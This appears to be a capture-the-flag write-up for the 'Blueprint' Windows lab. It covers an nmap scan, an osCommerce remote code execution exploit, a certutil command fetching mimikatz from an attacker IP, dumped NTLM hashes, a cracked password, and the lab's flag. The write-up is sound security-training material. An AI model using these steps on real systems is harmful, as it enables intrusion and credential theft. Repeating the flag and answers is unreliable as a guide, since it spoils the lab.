# Blueprint

## Solution

Starting with an nmap
```bash
cmd: sudo nmap -sC -sV -oN nmap/initial $IP

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49163/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:d1:8d:ec:e5:cf (unknown)
| Names:
|   BLUEPRINT<20>        Flags: <unique><active>
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-31T17:00:38+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-31T16:00:39
|_  start_date: 2021-07-31T15:56:23
```

Woah, kinda long this output ... 

I started poking at the 8080 port just because yes, not for any particular reason

There we find that directory listing is enabled and it is possible to find the version for the software running 

```bash

# getting software version
From $IP:8080/oscommerce-2.3.4/docs/CHANGELOG/ ->  osCommerce Online Merchant v2.3.4

# searching for vulnerabilities
cmd: searchsploit oscommerce 2.3
osCommerce 2.3.4.1 - Remote Code Execution    | php/webapps/44374.py   # Does not work
osCommerce 2.3.4.1 - Remote Code Execution (2)| php/webapps/50128.py   # WORKS!!!
```

Anddd, hackerman, i'm in
```bash
cmd: whaomi
nt authority\system

# What the hell, already system?!?!?!
```

Alright, lets get the root flag then ahah

```bash
cmd: type C:\Users\Administrator\Desktop\root.txt.txt

THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

**Flag:** THM{aea1e3ce6fe7f89e10cea833ae009bee}

Now we need to dump the **Lab** user NTLM hash and crack it.. For this lets use mimikatz to dum LSASS creds from memory... 

Before uploading mimikatz to the machine, we need to figure the architecture first
```bash
cmd: SET processor
PROCESSOR_ARCHITECTURE=x86 # 32-bit machine
```

The box is kinda weird, but i managed to download mimikatz to the machine by using the following command: ```certutil.exe -urlcache -split -f "http://10.9.128.84/mimikatz.exe" mimikatz.exe```

This might be an actual windows procedure, but im starting in windows basically now so, yeah...


```bash
# mimikatz output
mimikatz # lsadump::lsa /patch
Domain : BLUEPRINT / S-1-5-21-3130159037-241736515-3168549210

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003e8 (1000)
User : Lab
LM   :
NTLM : 30e87bf999828446a1c1209ddde4c450
```

John was tripping so i used crackstation (since this is supposed to be cracked, it is likely that it will be easy crackable)
```bash
Lab:30e87bf999828446a1c1209ddde4c450:googleplus
Administrator:549a1bcb88e35dc18c7a0b0168631411:Not Found
```

**Lab user password:** googleplus
